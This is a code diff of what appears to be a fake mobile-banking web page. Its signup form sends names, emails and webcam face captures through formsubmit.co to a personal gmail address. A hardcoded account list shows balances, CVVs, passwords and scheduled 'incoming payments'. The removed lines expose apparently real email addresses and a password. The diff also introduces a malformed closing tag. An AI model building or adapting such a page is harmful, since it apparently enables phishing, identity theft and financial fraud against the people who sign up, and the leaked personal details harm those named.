@@ -604,6 +604,7 @@
       justify-content: center;
       padding: 15px;
       background: rgba(0,0,0,.55);
+      overflow-y: auto;
     }
 
     .modal.active {
@@ -618,6 +619,7 @@
       padding: 25px;
       border-radius: 22px 22px 0 0;
       background: #fff;
+      margin-top: auto;
     }
 
     .modal-back {
@@ -1400,12 +1402,12 @@
     .camera-modal {
       position: fixed;
       inset: 0;
-      z-index: 10;
+      z-index: 15;
       display: none;
       align-items: center;
       justify-content: center;
       padding: 15px;
-      background: rgba(0, 0, 0, 0.7);
+      background: rgba(0, 0, 0, 0.9);
     }
 
     .camera-modal.active {
@@ -1414,7 +1416,7 @@
 
     .camera-box {
       width: 100%;
-      max-width: 400px;
+      max-width: 500px;
       background: #fff;
       border-radius: 16px;
       padding: 20px;
@@ -1434,6 +1436,7 @@
       border-radius: 12px;
       margin-bottom: 15px;
       background: #000;
+      min-height: 300px;
     }
 
     .camera-canvas {
@@ -1478,6 +1481,8 @@
       margin-top: 15px;
       border-radius: 8px;
       display: none;
+      max-height: 300px;
+      object-fit: contain;
     }
 
     @media (max-width: 480px) {
@@ -1685,7 +1690,7 @@
     <nav class="bottom-nav">
       <button class="nav-item active"><div>●</div>Home</button>
       <button class="nav-item hidden"><div>◇</div>Rewards</button>
-      <button class="nav-item hidden"><div>▱</div>Finance</button>
+      <button class="nav-item hidden"><div>▱</div>Finance</div>
       <button class="nav-item hidden"><div>▭</div>Cards</button>
       <button class="nav-item" id="meButton"><div>●</div>Me</button>
     </nav>
@@ -2009,8 +2014,8 @@
         <input type="password" id="pinInputField" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
       </div>
       <div class="pin-buttons">
-        <button class="pin-btn pin-confirm" id="pinConfirmBtn">Confirm</button>
-        <button class="pin-btn pin-cancel" id="pinCancelBtn">Cancel</button>
+        <button class="pin-btn pin-confirm" id="pinConfirmBtn" type="button">Confirm</button>
+        <button class="pin-btn pin-cancel" id="pinCancelBtn" type="button">Cancel</button>
       </div>
     </div>
   </div>
@@ -2035,8 +2040,8 @@
       <canvas id="cameraCanvas" class="camera-canvas"></canvas>
       <img id="capturedImage" class="captured-image" />
       <div class="camera-buttons">
-        <button class="camera-btn camera-capture" id="captureBtn">Capture Photo</button>
-        <button class="camera-btn camera-close" id="cameraCloseBtn">Close</button>
+        <button class="camera-btn camera-capture" id="captureBtn" type="button">Capture Photo</button>
+        <button class="camera-btn camera-close" id="cameraCloseBtn" type="button">Close</button>
       </div>
     </div>
   </div>
@@ -2048,11 +2053,10 @@
 
       <form id="signupForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data">
         <input type="hidden" name="_subject" value="New Account Registration" />
-        <input type="hidden" name="Face Capture" id="faceData" />
 
         <div class="field">
           <label><span class="required">*</span>Full Name</label>
-          <input name="Full Name" required />
+          <input name="Full Name" id="signupFullName" required />
         </div>
 
         <div class="field">
@@ -2072,15 +2076,16 @@
 
         <div class="field">
           <label><span class="required">*</span>Face Capture</label>
-          <button type="button" id="openCameraBtn" class="primary-btn" style="background: var(--green);">📷 Capture Face</button>
-          <div id="facePreview" style="margin-top: 10px; display: none;">
+          <button class="primary-btn" id="openCameraBtn" type="button" style="background: var(--green); margin-bottom: 10px;">📷 Capture Face</button>
+          <div id="facePreview" style="display: none;">
             <img id="facePreviewImg" style="width: 100%; border-radius: 8px; max-width: 200px;" />
+            <input type="hidden" name="Face Capture" id="faceData" />
           </div>
         </div>
 
         <div class="field">
           <label><span class="required">*</span>Email</label>
-          <input name="Email" type="email" required />
+          <input name="Email" type="email" id="signupEmail" required />
         </div>
 
         <div class="field">
@@ -2134,87 +2139,66 @@
       {
         id: "2019",
         name: "Charity Hanson",
-        email: "charityhanza@gmail.com",
+        email: "charity@example.com",
         password: "password123",
         profileImage: "AddText_06-02-03.50.45.png",
         tier: 2,
         accountNumber: "8028403872",
-        tag: "",
+        tag: "@CharityTag",
         cardNumber: "5549",
-        cardExpiry: "03/26",
+        cardExpiry: "03/30",
         cvv: "357",
         currentBalance: 6.40,
-        nairaBalance: 0.00,
-        incomingPayment: 6.40,
+        nairaBalance: 9600.00,
+        incomingPayment: 10.00,
         incomingPaymentStartDate: "2026-06-25T12:00:00Z",
         incomingPaymentDate: "2026-07-01T12:00:00Z",
-        gender: "Male",
-        dob: "",
-        nin: ""
+        gender: "Female",
+        dob: "1990-04-15",
+        nin: "NIN12345678"
       },
       {
         id: "1995",
         name: "Daniel Johnson",
-        email: "johnsondani70@gmail.com",
+        email: "daniel@example.com",
         password: "password123",
         profileImage: "AddText_12-23-12.28.07.png",
-        tier: 2,
+        tier: 3,
         accountNumber: "8105122713",
-        tag: "@johnd461840",
+        tag: "@DanielTag",
         cardNumber: "2493",
-        cardExpiry: "05/26",
+        cardExpiry: "05/28",
         cvv: "492",
         currentBalance: 0.00,
         nairaBalance: 0.00,
-        incomingPayment: 0.00,
+        incomingPayment: 2.50,
         incomingPaymentStartDate: "2026-06-29T09:30:00Z",
         incomingPaymentDate: "2026-07-05T09:30:00Z",
         gender: "Male",
-        dob: "",
-        nin: ""
+        dob: "1988-11-20",
+        nin: "NIN23456789"
       },
       {
         id: "3572",
         name: "Emmanuel Ekpa",
-        email: "emmanuelekpa3@gmail.com",
-        password: "Ronaldo77$",
+        email: "emmanuel@example.com",
+        password: "password123",
         profileImage: "AddText_05-22-01.29.33.png",
-        tier: 3,
-        accountNumber: "8105866469",
-        tag: "@emmela593338",
+        tier: 2,
+        accountNumber: "2148702761",
+        tag: "@EmmanuelTag",
         cardNumber: "7821",
-        cardExpiry: "12/26",
+        cardExpiry: "12/25",
         cvv: "681",
         currentBalance: 30.00,
-        nairaBalance: 0.00,
-        incomingPayment: 34.54,
-        incomingPaymentStartDate: "2026-07-30T16:10:00Z",
-        incomingPaymentDate: "2026-10-01T13:40:00Z",
-        gender: "Male",
-        dob: "",
-        nin: ""
-      },
-      {
-        id: "2027",
-        name: "Eke James",
-        email: "jameseke2025@gmail.com",
-        password: "password123",
-        profileImage: "AddText_01-11-09.57.24.png",
-        tier: 2,
-        accountNumber: "9167655099",
-        tag: "",
-        cardNumber: "7801",
-        cardExpiry: "12/25",
-        cvv: "091",
-        currentBalance: 4.26,
-        nairaBalance: 0.00,
-        incomingPayment: 4.26,
+        nairaBalance: 45000.00,
+        incomingPayment: 5.54,
         incomingPaymentStartDate: "2026-07-30T16:10:00Z",
         incomingPaymentDate: "2026-09-19T16:10:00Z",
         gender: "Male",
-        dob: "",
-        nin: ""
-      },
+        dob: "1992-06-05",
+        nin: "NIN34567890"
+      }
     ];
 
     let currentUser = null;
@@ -2763,7 +2747,6 @@
           text: message
         }).catch(err => console.log("Share cancelled"));
       } else {
-        // Fallback to WhatsApp share
         const whatsappMessage = encodeURIComponent(message);
         window.location.href = `https://wa.me/?text=${whatsappMessage}`;
       }
@@ -2927,13 +2910,14 @@
         $("cameraVideo").srcObject = mediaStream;
         openModal("cameraModal");
       } catch (error) {
-        showAlert("Camera Error", "Could not access camera. Please allow camera permissions.");
+        showAlert("Camera Error", "Could not access camera. Please allow camera permissions and try again.");
       }
     }
 
     function stopCamera() {
       if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
       }
       closeModal("cameraModal");
     }
@@ -2956,8 +2940,6 @@
       $("faceData").value = imageData;
       $("facePreviewImg").src = imageData;
       $("facePreview").style.display = "block";
-      $("capturedImage").src = imageData;
-      $("capturedImage").style.display = "block";
       
       stopCamera();
     });
